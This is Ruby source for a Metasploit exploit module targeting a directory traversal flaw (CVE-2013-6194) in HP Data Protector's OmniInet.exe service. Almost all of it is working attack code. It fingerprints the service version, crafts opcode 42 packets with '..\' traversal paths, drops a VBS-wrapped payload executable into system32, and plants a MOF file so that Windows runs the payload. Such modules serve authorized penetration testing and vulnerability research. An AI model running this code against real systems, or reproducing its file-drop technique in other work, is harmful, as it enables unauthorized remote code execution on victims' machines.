# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require &#039;msf/core&#039;


class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::EXE
  include Msf::Exploit::WbemExec
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;HP Data Protector Backup Client Service Directory Traversal&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a directory traversal vulnerability in the Hewlett-Packard Data
        Protector product. The vulnerability exists at the Backup Client Service (OmniInet.exe)
        when parsing packets with opcode 42. This module has been tested successfully on HP Data
        Protector 6.20 on Windows 2003 SP2 and Windows XP SP3.
      },
      &#039;Author&#039;         =>
        [
          &#039;Brian Gorenc&#039;, # Vulnerability discovery
          &#039;juan vazquez&#039; # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-6194&#039; ],
          [ &#039;OSVDB&#039;, &#039;101630&#039; ],
          [ &#039;BID&#039;, &#039;64647&#039; ],
          [ &#039;ZDI&#039;, &#039;14-003&#039; ],
          [ &#039;URL&#039; , &#039;https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03822422&#039; ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 2048, # Payload embedded into an exe
          &#039;DisableNops&#039; => true
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 5
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Targets&#039;         =>
        [
          [ &#039;HP Data Protector 6.20 build 370 / Windows 2003 SP2&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 02 2014&#039;))

    register_options([Opt::RPORT(5555)], self.class)
  end

  def check
    fingerprint = get_fingerprint

    if fingerprint.nil?
      return Exploit::CheckCode::Unknown
    end

    print_status("#{peer} - HP Data Protector version #{fingerprint}")

    if fingerprint =~ /HP Data Protector A\.06\.(\d+)/
      minor = $1.to_i
    else
      return Exploit::CheckCode::Safe
    end

    if minor < 21
      return Exploit::CheckCode::Vulnerable
    elsif minor == 21
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Detected
    end

  end

  def exploit
    # Setup the necessary files to do the wbemexec trick
    vbs_name = rand_text_alpha(rand(10)+5) + &#039;.vbs&#039;
    exe      = generate_payload_exe
    vbs      = Msf::Util::EXE.to_exe_vbs(exe)
    mof_name = rand_text_alpha(rand(10)+5) + &#039;.mof&#039;
    mof      = generate_mof(mof_name, vbs_name)

    # We can&#039;t upload binary contents, so embedding the exe into a VBS.
    print_status("#{peer} - Sending malicious packet with opcode 42 to upload the vbs payload #{vbs_name}...")
    upload_file("windows\\system32\\#{vbs_name}", vbs)
    register_file_for_cleanup(vbs_name)

    print_status("#{peer} - Sending malicious packet with opcode 42 to upload the mof file #{mof_name}")
    upload_file("WINDOWS\\system32\\wbem\\mof\\#{mof_name}", mof)
    register_file_for_cleanup("wbem\\mof\\good\\#{mof_name}")
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def build_pkt(fields)
    data = "\xff\xfe" # BOM Unicode
    fields.each do |v|
      data << "#{Rex::Text.to_unicode(v)}\x00\x00"
      data << Rex::Text.to_unicode(" ") # Separator
    end

    data.chomp!(Rex::Text.to_unicode(" ")) # Delete last separator
    return [data.length].pack("N") + data
  end

  def get_fingerprint
    ommni = connect
    ommni.put(rand_text_alpha_upper(64))
    resp = ommni.get_once(-1)
    disconnect

    if resp.nil?
      return nil
    end

    return Rex::Text.to_ascii(resp).chop.chomp # Delete unicode last nl
  end

  def upload_file(file_name, contents)
    connect
    pkt = build_pkt([
      "2", # Message Type
      rand_text_alpha(8),
      rand_text_alpha(8),
      rand_text_alpha(8),
      rand_text_alpha(8),
      rand_text_alpha(8),
      "42", # Opcode
      rand_text_alpha(8), # command
      rand_text_alpha(8), # rissServerName
      rand_text_alpha(8), # rissServerPort
      "\\..\\..\\..\\..\\..\\#{file_name}", # rissServerCertificate
      contents # Certificate contents
    ])
    sock.put(pkt)
    sock.get_once
    # You cannot be confident about the response to guess if upload
    # has been successful or not. While testing, different result codes,
    # including also no response because of timeout due to a process
    # process execution after file write on the target
    disconnect
  end

end

